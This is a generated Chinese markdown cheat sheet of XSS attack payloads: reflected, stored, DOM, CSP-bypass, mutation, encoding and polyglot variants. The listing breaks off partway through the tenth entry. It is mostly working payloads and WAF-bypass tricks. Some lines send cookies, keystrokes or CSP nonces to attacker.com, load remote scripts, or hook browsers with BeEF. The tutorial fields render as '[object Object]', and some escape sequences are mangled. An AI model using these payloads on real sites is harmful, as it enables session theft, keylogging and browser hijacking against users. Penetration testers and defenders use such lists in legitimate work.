# XSS跨站脚本 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（12 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 反射型XSS

- **id:** `xss-reflected`
- **分类:** XSS跨站脚本 / 反射型
- **tags:** `xss` `reflected` `javascript`

反射型跨站脚本攻击技术

**前置条件**

- 存在用户输入反射到页面
- 输入未经过滤或编码

**利用步骤**

#### 1. 探测XSS注入点

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus "
```

基础XSS探测

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML script标签 | tag |
| `alert(1)` | JavaScript弹窗函数 | function |
| `onerror` | 图片加载错误事件 | value |
| `onload` | 元素加载完成事件 | value |

#### 2. 事件处理器绕过

```
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

使用各种事件处理器

| 片段 | 说明 | 类型 |
|---|---|---|
| `onerror` | 错误事件 | value |
| `onload` | 加载事件 | value |
| `onfocus` | 获取焦点事件 | value |
| `onstart` | 开始事件 | value |

#### 3. 标签绕过

```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
```

大小写混淆和标签变形

| 片段 | 说明 | 类型 |
|---|---|---|
| `ScRiPt` | 大小写混合绕过 | value |
| `svg/onload` | 使用斜杠代替空格 | value |

#### 4. 窃取Cookie

```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>location="http://attacker.com/steal?c="+document.cookie</script>
```

窃取用户Cookie

| 片段 | 说明 | 类型 |
|---|---|---|
| `document.cookie` | 获取当前页面Cookie | function |
| `new Image().src` | 创建图片对象发送请求 | value |
| `fetch()` | 使用Fetch API发送请求 | function |

#### 5. 键盘记录

```
<script>
document.onkeypress=function(e){
  fetch("http://attacker.com/log?key="+e.key)
}
</script>
```

记录用户键盘输入

| 片段 | 说明 | 类型 |
|---|---|---|
| `onkeypress` | 键盘按下事件 | value |
| `e.key` | 按下的键值 | value |

**WAF 绕过**

#### HTML实体编码

```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

使用HTML实体编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `&#97;` | a的十进制HTML实体 | encoding |
| `&#x61;` | a的十六进制HTML实体 | encoding |

#### Unicode编码

```
<script>\u0061lert(1)</script>
<img src=x onerror=\u0061lert(1)>
```

使用Unicode编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `\a` | a的Unicode编码 | value |

#### 双写绕过

```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

双写绕过关键字删除

| 片段 | 说明 | 类型 |
|---|---|---|
| `<scr<script>` | HTML标签/事件处理器 | tag |
| `ipt>alert(1)` | 注入代码 | value |
| `</scr</script>` | HTML标签/事件处理器 | tag |
| `ipt> ` | 注入代码 | value |
| `<imimgg src=x onerror=alert(1)>` | HTML标签/事件处理器 | tag |

#### 注释混淆

```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

使用注释混淆

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | HTML标签/事件处理器 | tag |
| `/**/alert(1)/**/` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<img src=x/**/onerror=alert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<svg on<!--test-->` | HTML标签/事件处理器 | tag |
| `load=alert(1)>` | 注入代码 | value |

**教程**

[object Object]

---

### 2. 存储型XSS

- **id:** `xss-stored`
- **分类:** XSS跨站脚本 / 存储型
- **tags:** `xss` `stored` `persistent`

存储型跨站脚本攻击技术

**前置条件**

- 存在数据存储功能
- 存储数据未经过滤显示

**利用步骤**

#### 1. 探测存储点

```
在评论区、用户名、个人简介等处输入:
<script>alert(1)</script>
"><script>alert(1)</script>
测试是否存储并执行
```

探测存储型XSS

| 片段 | 说明 | 类型 |
|---|---|---|
| `在评论区、用户名、个人简介等处输入: ` | 注入代码 | value |
| `<script>` | HTML标签/事件处理器 | tag |
| `alert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| ` ">` | 注入代码 | value |
| `<script>` | HTML标签/事件处理器 | tag |
| `alert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| ` 测试是否存储并执行` | 注入代码 | value |

#### 2. 隐蔽Payload

```
<img src=x onerror=alert(1) style="display:none">
<svg/onload=alert(1) style="position:absolute;left:-9999px">
<div style="background:url(javascript:alert(1))">
```

使用隐蔽的XSS payload

| 片段 | 说明 | 类型 |
|---|---|---|
| `style="display:none"` | 隐藏元素 | value |
| `position:absolute;left:-9999px` | 移出可视区域 | value |

#### 3. 持久化控制

```
<script>
if(!window.xss_loaded){
  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://attacker.com/evil.js";
  document.body.appendChild(s);
}
</script>
```

加载外部恶意脚本

| 片段 | 说明 | 类型 |
|---|---|---|
| `createElement` | 创建DOM元素 | function |
| `appendChild` | 添加到DOM树 | function |

#### 4. BeEF Hook

```
<script src="http://beef-server:3000/hook.js"></script>
或:
<script>
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
</script>
```

使用BeEF框架控制浏览器

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script src="http://beef-server:3000/hook.js">` | HTML标签/事件处理器 | tag |
| `</script>` | HTML标签/事件处理器 | tag |
| ` 或: ` | 注入代码 | value |
| `<script>` | HTML标签/事件处理器 | tag |
| ` var s=document.createElement("script"); s.src="http://beef-server:3000/hook.js"; document.body.appendChild(s); ` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |

**WAF 绕过**

#### SVG标签绕过

```
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

使用SVG标签绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `<svg>` | HTML标签/事件处理器 | tag |
| `<script>` | HTML标签/事件处理器 | tag |
| `alert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| `</svg>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<svg>` | HTML标签/事件处理器 | tag |
| `<animate onbegin=alert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<svg>` | HTML标签/事件处理器 | tag |
| `<set onbegin=alert(1)>` | HTML标签/事件处理器 | tag |

#### Math标签绕过

```
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
```

使用MathML标签

| 片段 | 说明 | 类型 |
|---|---|---|
| `<math>` | HTML标签/事件处理器 | tag |
| `<maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">` | HTML标签/事件处理器 | tag |
| `click` | 注入代码 | value |
| `</maction>` | HTML标签/事件处理器 | tag |
| `</math>` | HTML标签/事件处理器 | tag |

**教程**

[object Object]

---

### 3. DOM型XSS

- **id:** `xss-dom`
- **分类:** XSS跨站脚本 / DOM型
- **tags:** `xss` `dom` `javascript`

基于DOM的跨站脚本攻击

**前置条件**

- 存在JavaScript动态操作DOM
- 用户输入直接写入DOM

**利用步骤**

#### 1. 探测DOM XSS

```
#<script>alert(1)</script>
?param=<img src=x onerror=alert(1)>
检查location.hash、location.search等是否直接写入DOM
```

探测DOM型XSS

| 片段 | 说明 | 类型 |
|---|---|---|
| `location.hash` | URL中#后面的部分 | value |
| `location.search` | URL中?后面的查询字符串 | value |

#### 2. 常见Sink点

```
document.write(location.hash)
innerHTML = location.search
eval(location.hash)
setTimeout(location.hash, 0)
jQuery(html)
$(location.hash)
```

常见的DOM XSS Sink点

| 片段 | 说明 | 类型 |
|---|---|---|
| `document.write` | 直接写入HTML | value |
| `innerHTML` | 设置元素HTML内容 | value |
| `eval()` | 执行JavaScript代码 | value |

#### 3. location.hash利用

```
URL: http://target.com/#<img src=x onerror=alert(1)>
如果页面有: document.write(location.hash)
则触发XSS
```

利用location.hash

| 片段 | 说明 | 类型 |
|---|---|---|
| `URL: http://target.com/#` | 注入代码 | value |
| `<img src=x onerror=alert(1)>` | HTML标签/事件处理器 | tag |
| ` 如果页面有: document.write(location.hash) 则触发XSS` | 注入代码 | value |

#### 4. postMessage利用

```
window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
攻击页面:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
```

利用postMessage

| 片段 | 说明 | 类型 |
|---|---|---|
| `<img>` | 图片标签 | tag |
| `onerror` | 错误事件 | keyword |
| `alert()` | 弹窗函数 | function |
| `innerHTML` | DOM内容修改 | variable |

**WAF 绕过**

#### javascript:协议变体绕过

```
javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
```

使用大小写混淆、HTML实体编码、制表符插入等方式绕过javascript:协议过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `javascript:alert(1) javascript	:alert(1) jaVaScRiPt:alert(1) &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1) ` | 注入代码 | value |
| `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">` | HTML标签/事件处理器 | tag |
| `click` | 注入代码 | value |
| `</a>` | HTML标签/事件处理器 | tag |

#### SVG/MathML标签与事件处理器绕过

```
<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
```

利用SVG、MathML等非标准HTML标签及冷门事件处理器(ontoggle、onpageshow)绕过标签和事件黑名单

| 片段 | 说明 | 类型 |
|---|---|---|
| `<svg onload=alert(1)>` | HTML标签/事件处理器 | tag |
| `<svg/onload=alert(1)>` | HTML标签/事件处理器 | tag |
| `<math>` | HTML标签/事件处理器 | tag |
| `<mtext>` | HTML标签/事件处理器 | tag |
| `<table>` | HTML标签/事件处理器 | tag |
| `<mglyph>` | HTML标签/事件处理器 | tag |
| `<svg>` | HTML标签/事件处理器 | tag |
| `<mtext>` | HTML标签/事件处理器 | tag |
| `<textarea>` | HTML标签/事件处理器 | tag |
| `<path id="</textarea>` | HTML标签/事件处理器 | tag |
| `<img onerror=alert(1) src=1>` | HTML标签/事件处理器 | tag |
| `"> ` | 注入代码 | value |
| `<details open ontoggle=alert(1)>` | HTML标签/事件处理器 | tag |
| `<body onpageshow=alert(1)>` | HTML标签/事件处理器 | tag |
| `<input onfocus=alert(1) autofocus>` | HTML标签/事件处理器 | tag |

**教程**

[object Object]

---

### 4. CSP绕过

- **id:** `xss-csp-bypass`
- **分类:** XSS跨站脚本 / CSP绕过
- **tags:** `xss` `csp` `bypass`

绕过内容安全策略(CSP)的XSS技术

**前置条件**

- 存在XSS漏洞
- 存在CSP策略但配置不当

**利用步骤**

#### 1. 分析CSP策略

```
查看HTTP响应头:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
或使用CSP Evaluator工具分析
```

分析CSP配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `查看HTTP响应头:` | 命令/关键字 | command |

#### 2. 利用unsafe-inline

```
如果CSP包含unsafe-inline:
<script>alert(1)</script>
可以直接执行内联脚本
```

利用unsafe-inline配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `如果CSP包含unsafe-inline: ` | 注入代码 | value |
| `<script>` | HTML标签/事件处理器 | tag |
| `alert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| ` 可以直接执行内联脚本` | 注入代码 | value |

#### 3. 利用unsafe-eval

```
如果CSP包含unsafe-eval:
<script>eval("alert(1)")</script>
<script>setTimeout("alert(1)", 0)</script>
可以使用eval等函数
```

利用unsafe-eval配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `如果CSP包含unsafe-eval: ` | 注入代码 | value |
| `<script>` | HTML标签/事件处理器 | tag |
| `eval("alert(1)")` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| `<script>` | HTML标签/事件处理器 | tag |
| `setTimeout("alert(1)", 0)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| ` 可以使用eval等函数` | 注入代码 | value |

#### 4. JSONP绕过

```
如果允许的域名有JSONP端点:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
利用JSONP回调执行代码
```

利用JSONP绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `callback` | JSONP回调参数 | value |

#### 5. AngularJS绕过

```
如果允许了AngularJS CDN:
<div ng-app ng-csp>
<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
</div>
</div>
```

利用AngularJS绕过CSP

| 片段 | 说明 | 类型 |
|---|---|---|
| `alert()` | 弹窗函数 | function |

#### 6. Dangling Markup

```
<img src='http://attacker.com/?
捕获后续HTML内容直到遇到单引号
```

利用悬挂标记窃取数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `<img>` | 图片标签 | tag |

**WAF 绕过**

#### JSONP端点劫持CSP

```
# 寻找白名单域上的JSONP端点:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>
```

利用CSP白名单域上的JSONP回调端点或AngularJS库执行任意JavaScript，无需unsafe-inline

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 寻找白名单域上的JSONP端点: ` | 注入代码 | value |
| `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">` | HTML标签/事件处理器 | tag |
| `</script>` | HTML标签/事件处理器 | tag |
| `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js">` | HTML标签/事件处理器 | tag |
| `</script>` | HTML标签/事件处理器 | tag |
| `<div ng-app ng-csp>` | HTML标签/事件处理器 | tag |
| `{{$eval.constructor("alert(1)")()}}` | 注入代码 | value |
| `</div>` | HTML标签/事件处理器 | tag |

#### base-uri劫持与script nonce泄露

```
# base-uri未限制时:
<base href="http://attacker.com/">
# 页面中相对路径的脚本将从attacker.com加载

# nonce泄露利用:
# 通过CSS注入窃取nonce:
<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
# 或通过DOM读取: document.querySelector("script[nonce]").nonce
```

利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值

| 片段 | 说明 | 类型 |
|---|---|---|
| `# base-uri未限制时: ` | 注入代码 | value |
| `<base href="http://attacker.com/">` | HTML标签/事件处理器 | tag |
| ` # 页面中相对路径的脚本将从attacker.com加载  # nonce泄露利用: # 通过CSS注入窃取nonce: ` | 注入代码 | value |
| `<style>` | HTML标签/事件处理器 | tag |
| `script[nonce^="a"]{background:url(http://attacker.com/?n=a)}` | 注入代码 | value |
| `</style>` | HTML标签/事件处理器 | tag |
| ` # 或通过DOM读取: document.querySelector("script[nonce]").nonce` | 注入代码 | value |

**教程**

[object Object]

---

### 5. 突变型XSS(mXSS)

- **id:** `xss-mxss`
- **分类:** XSS跨站脚本 / 突变型
- **tags:** `xss` `mxss` `mutation` `bypass`

利用浏览器解析差异导致的XSS攻击

**前置条件**

- 存在HTML输出点
- 浏览器解析差异

**利用步骤**

#### 1. 基础mXSS探测

```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

利用noscript标签解析差异

| 片段 | 说明 | 类型 |
|---|---|---|
| `<noscript>` | 脚本禁用时显示的内容 | tag |
| `p title` | 属性值在解析时变化 | value |
| `</noscript>` | 闭合标签导致突变 | tag |

#### 2. SVG mXSS

```
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
<svg><script><![CDATA[alert(1)]]></script></svg>
```

SVG CDATA突变

| 片段 | 说明 | 类型 |
|---|---|---|
| `<script>` | 脚本标签 | tag |
| `<img>` | 图片标签 | tag |
| `<svg>` | SVG标签 | tag |
| `onerror` | 错误事件处理器 | keyword |

#### 3. Math mXSS

```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

MathML突变XSS

| 片段 | 说明 | 类型 |
|---|---|---|
| `<img>` | 图片标签 | tag |
| `onerror` | 错误事件处理器 | keyword |
| `alert()` | 弹窗函数 | function |

#### 4. DOM clobbering配合

```
<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
```

利用DOM clobbering

| 片段 | 说明 | 类型 |
|---|---|---|
| `id=x` | 重复ID导致DOM变化 | value |

**WAF 绕过**

#### 嵌套标签绕过

```
<svg><script>&#97;lert(1)</script></svg>
<svg><script>a&#108;ert(1)</script></svg>
```

SVG内脚本编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `<svg>` | HTML标签/事件处理器 | tag |
| `<script>` | HTML标签/事件处理器 | tag |
| `&#97;lert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| `</svg>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<svg>` | HTML标签/事件处理器 | tag |
| `<script>` | HTML标签/事件处理器 | tag |
| `a&#108;ert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| `</svg>` | HTML标签/事件处理器 | tag |

**教程**

[object Object]

---

### 6. Unicode XSS

- **id:** `xss-unicode`
- **分类:** XSS跨站脚本 / Unicode编码
- **tags:** `xss` `unicode` `encoding` `bypass`

利用Unicode编码特性绕过过滤

**前置条件**

- 存在XSS注入点
- 过滤器检查关键字

**利用步骤**

#### 1. Unicode转义

```
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<script>\u{61}lert(1)</script>
```

JavaScript Unicode转义

| 片段 | 说明 | 类型 |
|---|---|---|
| `\a` | a的Unicode转义（4位） | value |
| `\x61` | a的十六进制转义 | value |
| `\u{61}` | a的Unicode码点转义 | value |

#### 2. HTML实体编码

```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

HTML十进制/十六进制实体

| 片段 | 说明 | 类型 |
|---|---|---|
| `&#97;` | a的十进制HTML实体 | encoding |
| `&#x61;` | a的十六进制HTML实体 | encoding |

#### 3. Unicode规范化攻击

```
使用规范化等效字符:
＜script＞alert(1)＜/script＞
使用全角字符绕过
```

利用Unicode规范化

| 片段 | 说明 | 类型 |
|---|---|---|
| `＜` | 全角小于号(U+FF1C) | value |
| `＞` | 全角大于号(U+FF1E) | value |

#### 4. UTF-7编码

```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
需要页面使用UTF-7编码
```

UTF-7编码XSS

| 片段 | 说明 | 类型 |
|---|---|---|
| `+ADw-` | UTF-7编码的< | value |
| `+AD4-` | UTF-7编码的> | value |

**WAF 绕过**

#### 混合编码绕过

```
<img src=x onerror=\u0061&#108;ert(1)>
<img src=x onerror="\u0061lert`1`">
```

混合多种编码方式

| 片段 | 说明 | 类型 |
|---|---|---|
| `<img src=x onerror=\a&#108;ert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<img src=x onerror="\alert`1`">` | HTML标签/事件处理器 | tag |

#### 过长UTF-8编码

```
<img src=x onerror=alert(1)>
使用非最短UTF-8编码形式
```

利用服务器UTF-8解析差异

| 片段 | 说明 | 类型 |
|---|---|---|
| `<img src=x onerror=alert(1)>` | HTML标签/事件处理器 | tag |
| ` 使用非最短UTF-8编码形式` | 注入代码 | value |

**教程**

[object Object]

---

### 7. XSS过滤器绕过

- **id:** `xss-filter-bypass`
- **分类:** XSS跨站脚本 / 过滤器绕过
- **tags:** `xss` `filter` `bypass` `waf`

各种绕过XSS过滤器的技术

**前置条件**

- 存在XSS注入点
- 存在过滤机制

**利用步骤**

#### 1. 大小写混淆

```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG OnLoAd=alert(1)>
```

混合大小写绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `ScRiPt` | 大小写混合的script标签 | value |
| `OnErRoR` | 大小写混合的事件处理器 | value |

#### 2. 双写绕过

```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

双写绕过关键字删除

| 片段 | 说明 | 类型 |
|---|---|---|
| `scr<script>ipt` | 中间的script被删除后形成完整标签 | value |

#### 3. 注释混淆

```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

使用注释混淆

| 片段 | 说明 | 类型 |
|---|---|---|
| `/**/` | JavaScript注释 | operator |
| `<!--test-->` | HTML注释 | value |

#### 4. 空字节截断

```
<scr\x00ipt>alert(1)</script>
<img src=x onerror=alert\x00(1)>
```

空字节截断绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `\x00` | 空字节，某些过滤器会在此截断 | value |

#### 5. 标签属性绕过

```
<img src=x onerror=alert(1)>
<img src=x onerror =alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
```

利用空白字符绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `onerror =` | 等号前加空格 | value |
| `onerror	=` | 等号前加Tab | value |

#### 6. 事件处理器变体

```
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```

使用少见的事件处理器

| 片段 | 说明 | 类型 |
|---|---|---|
| `<body onpageshow=alert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<input onfocus=alert(1) autofocus>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<marquee onstart=alert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<video>` | HTML标签/事件处理器 | tag |
| `<source onerror=alert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<details open ontoggle=alert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<audio src=x onerror=alert(1)>` | HTML标签/事件处理器 | tag |

**WAF 绕过**

#### Data URI绕过

```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```

使用Data URI

| 片段 | 说明 | 类型 |
|---|---|---|
| `<a href="data:text/html,<script>` | HTML标签/事件处理器 | tag |
| `alert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| `">click` | 注入代码 | value |
| `</a>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<iframe src="data:text/html,<script>` | HTML标签/事件处理器 | tag |
| `alert(1)` | 注入代码 | value |
| `</script>` | HTML标签/事件处理器 | tag |
| `">` | 注入代码 | value |

#### SVG动画绕过

```
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

SVG动画事件

| 片段 | 说明 | 类型 |
|---|---|---|
| `<svg>` | HTML标签/事件处理器 | tag |
| `<animate onbegin=alert(1)>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<svg>` | HTML标签/事件处理器 | tag |
| `<set onbegin=alert(1)>` | HTML标签/事件处理器 | tag |

**教程**

[object Object]

---

### 8. XSS编码绕过

- **id:** `xss-encoding`
- **分类:** XSS跨站脚本 / 编码绕过
- **tags:** `xss` `encoding` `bypass`

利用各种编码技术绕过XSS过滤

**前置条件**

- 存在XSS注入点
- 存在编码处理

**利用步骤**

#### 1. URL编码

```
<img src=x onerror=%61lert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
```

URL编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `%61` | a的URL编码 | encoding |
| `%3C` | <的URL编码 | encoding |
| `%3E` | >的URL编码 | encoding |

#### 2. HTML实体编码

```
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>
&lt;script&gt;alert(1)&lt;/script&gt;
```

HTML实体编码

| 片段 | 说明 | 类型 |
|---|---|---|
| `&#97;` | a的十进制HTML实体 | encoding |
| `&#x61;` | a的十六进制HTML实体 | encoding |
| `&lt;` | <的命名实体 | value |

#### 3. JavaScript编码

```
<img src=x onerror="\u0061lert(1)">
<img src=x onerror="\x61lert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

JavaScript编码

| 片段 | 说明 | 类型 |
|---|---|---|
| `\a` | Unicode转义 | value |
| `atob()` | Base64解码函数 | function |
| `YWxlcnQoMSk=` | alert(1)的Base64 | value |

#### 4. CSS编码

```
<style>body{background:url("javascript:alert(1)")}</style>
<div style="x:expression(alert(1))">
```

CSS编码（旧版IE）

| 片段 | 说明 | 类型 |
|---|---|---|
| `<style>` | HTML标签/事件处理器 | tag |
| `body{background:url("javascript:alert(1)")}` | 注入代码 | value |
| `</style>` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<div style="x:expression(alert(1))">` | HTML标签/事件处理器 | tag |

#### 5. 混合编码

```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```

混合多种编码

| 片段 | 说明 | 类型 |
|---|---|---|
| `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">` | HTML标签/事件处理器 | tag |
| ` ` | 注入代码 | value |
| `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">` | HTML标签/事件处理器 | tag |
| `click` | 注入代码 | value |
| `</a>` | HTML标签/事件处理器 | tag |

**WAF 绕过**

#### 双重URL编码

```
%253Cscript%253Ealert(1)%253C/script%253E
服务器解码两次时使用
```

双重URL编码

| 片段 | 说明 | 类型 |
|---|---|---|
| `%253Cscript%253Ealert(1)%253C/script%253E 服务器解码两次时使用` | 注入代码 | value |

#### UTF-16编码

```
%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E
```

UTF-16编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E` | 注入代码 | value |

**教程**

[object Object]

---

### 9. Polyglot XSS

- **id:** `xss-polyglot`
- **分类:** XSS跨站脚本 / Polyglot
- **tags:** `xss` `polyglot` `universal`

多环境通用的XSS payload

**前置条件**

- 存在XSS注入点
- 不确定具体环境

**利用步骤**

#### 1. 经典Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

经典多环境Polyglot

| 片段 | 说明 | 类型 |
|---|---|---|
| `jaVasCript:` | JavaScript协议，大小写混合 | value |
| `/*-/*`/*\`/*` | 注释和模板字符串混淆 | value |
| `oNcLiCk=alert()` | 点击事件 | function |
| `</stYle/</titLe` | 闭合多种标签 | value |
| `<sVg/oNloAd=alert()` | SVG标签XSS | tag |

#### 2. 短Polyglot

```
'"-->]]>*/</script></style></title></textarea><script>alert(1)</script>
```

短版本Polyglot

#### 3. 属性注入Polyglot

```
'onmouseover=alert(1) x='
"onfocus=alert(1) autofocus x="
'onclick=alert(1)//
```

属性值注入Polyglot

#### 4. URL参数Polyglot

```
javascript:alert(1)//http://
data:text/html,<script>alert(1)</script>
```

URL参数Polyglot

**WAF 绕过**

#### 高级Polyglot

```
-->'"<svg onload=alert(1)>"><script>alert(1)</script>
```

简洁高效Polyglot

| 片段 | 说明 | 类型 |
|---|---|---|
| `-->` | HTML注释结束符 | technique |
| `<svg onload=alert(1)>` | SVG事件处理器触发XSS | tag |
| `<script>alert(1)</script>` | 脚本标签执行 | tag |

**教程**

[object Object]

---

### 10. XSS Cookie窃取

- **id:** `xss-cookie-theft`
- **分类:** XSS跨站脚本 / Cookie窃取
- **tags:** `xss` `cookie` `theft` `session`

利用XSS窃取用户Cookie

**前置条件**

- 存在XSS漏洞
- Cookie未设置HttpOnly

**利用步骤**

#### 1. 基础Cookie窃取

```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

使用Image对象发送Cookie

| 片段 | 说明 | 类型 |
|---|---|---|
| `new Image()` | 创建图片对象 | function |
| `.src` | 设置图片源触发HTTP请求 | value |
| `document.cookie` | 获取当前页面Cookie | function |

#### 2. Fetch API窃取

```
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>
```

使用Fetch/Beacon API

| 片段 | 说明 | 类型 |
|---|---|---|
| `fetch()` | 现代HTTP请求API | function |
| `sendBeacon()` | 异步发送数据，不阻塞页面 | function |

#### 3. XMLHttpRequest窃取

```
<script>
var xhr = new XMLHttpRequest();
